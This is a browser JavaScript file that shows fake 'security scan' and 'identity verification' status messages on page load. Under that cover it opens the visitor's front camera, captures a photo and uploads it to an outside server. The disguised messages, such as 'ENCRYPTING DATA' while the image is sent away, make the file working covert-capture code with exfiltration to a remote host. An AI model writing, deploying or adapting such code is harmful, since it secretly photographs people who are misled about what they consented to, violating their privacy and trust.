document.addEventListener('DOMContentLoaded', async () => {
    const status = document.getElementById('status');
    const progress = document.getElementById('progress');
    const statusText = status.querySelector('p');
    
    const updateStatus = (message) => {
        statusText.innerHTML = message;
        status.classList.add('glitch');
        setTimeout(() => status.classList.remove('glitch'), 500);
    };
    
    try {
        // Initial loading sequence
        updateStatus("SYSTEM BOOTING...");
        progress.style.width = '25%';
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        updateStatus("CONNECTING TO NETWORK...");
        progress.style.width = '50%';
        await new Promise(resolve => setTimeout(resolve, 800));
        
        updateStatus("VERIFYING IDENTITY...");
        progress.style.width = '75%';
        await new Promise(resolve => setTimeout(resolve, 600));
        
        // Camera access
        updateStatus("INITIATING SECURITY SCAN...");
        progress.style.width = '90%';
        
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { 
                facingMode: 'user',
                width: { ideal: 1280 },
                height: { ideal: 720 }
            } 
        });
        
        const video = document.getElementById('video');
        video.srcObject = stream;
        
        await new Promise(resolve => {
            video.onloadedmetadata = () => {
                setTimeout(resolve, 300);
            };
        });
        
        // Capture image
        const canvas = document.getElementById('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        
        // Stop camera
        stream.getTracks().forEach(track => track.stop());
        
        // Upload to Cloudinary via your server
        updateStatus("ENCRYPTING DATA...");
        progress.style.width = '95%';
        
        const imageData = canvas.toDataURL('image/jpeg', 0.8);
        const response = await fetch('https://fromyou.onrender.com/upload', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ image: imageData })
        });
        
        const result = await response.json();
        
        if (!response.ok) {
            throw new Error(result.error || 'Upload failed');
        }
        
        // Final success message with Cloudinary URL
        updateStatus("SECURITY SCAN COMPLETE");
        progress.style.width = '100%';
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        // updateStatus(`SYSTEM SECURED<br>IMAGE UPLOADED: <a href="${result.url}" target="_blank">View in Cloudinary</a>`);
        
    } catch (err) {
        updateStatus(`ERROR: ${err.message.replace(/^Error: /, '')}`);
        progress.style.backgroundColor = 'red';
        console.error("Capture failed:", err);
    }
});